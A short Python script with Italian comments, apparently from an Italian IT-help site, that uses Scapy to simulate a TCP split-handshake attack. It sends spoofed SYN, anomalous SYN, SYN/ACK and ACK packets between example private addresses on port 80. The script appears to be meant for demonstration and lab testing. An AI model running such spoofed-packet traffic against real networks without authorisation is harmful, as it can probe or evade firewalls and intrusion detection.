#!/usr/bin/env python3
# Software per simulare uno Split HandShake Attack
# 2025 - aiutocomputerhelp.it
from scapy.all import IP, TCP, send
import time
def simulate_split_handshake(client_ip, server_ip, client_port, server_port):
    # 1. Il client invia il pacchetto SYN per iniziare la connessione
    ip_layer = IP(src=client_ip, dst=server_ip)
    tcp_syn = TCP(sport=client_port, dport=server_port, flags="S", seq=1000)
    syn_packet = ip_layer / tcp_syn
    print("[*] Client: Invio SYN")
    send(syn_packet, verbose=True)
    time.sleep(1)
    # 2. Il server risponde in modo anomalo con un pacchetto SYN anziché SYN/ACK
    ip_layer_server = IP(src=server_ip, dst=client_ip)
    tcp_syn_anomaly = TCP(sport=server_port, dport=client_port, flags="S", seq=2000)
    anomaly_packet = ip_layer_server / tcp_syn_anomaly
    print("[*] Server (anomalo): Invio SYN (invece di SYN/ACK)")
    send(anomaly_packet, verbose=True)
    time.sleep(1)
    # 3. Il client, ricevendo un SYN inatteso, risponde con un SYN/ACK
    tcp_syn_ack = TCP(sport=client_port, dport=server_port, flags="SA", seq=1001, ack=2001)
    syn_ack_packet = ip_layer / tcp_syn_ack
    print("[*] Client: Invio SYN/ACK in risposta al SYN anomalo")
    send(syn_ack_packet, verbose=True)
    time.sleep(1)
    # 4. Il server completa il handshake con un ACK finale
    tcp_ack = TCP(sport=server_port, dport=client_port, flags="A", seq=2001, ack=1002)
    ack_packet = ip_layer_server / tcp_ack
    print("[*] Server: Invio ACK per completare il handshake")
    send(ack_packet, verbose=True)
if __name__ == '__main__':
    # Configurazioni di esempio: modifica questi parametri in base all'ambiente di test
    client_ip = "192.168.1.100"
    server_ip = "192.168.1.1"
    client_port = 12345   # Porta arbitraria sul client
    server_port = 80      # Porta standard HTTP sul server
    simulate_split_handshake(client_ip, server_ip, client_port, server_port)
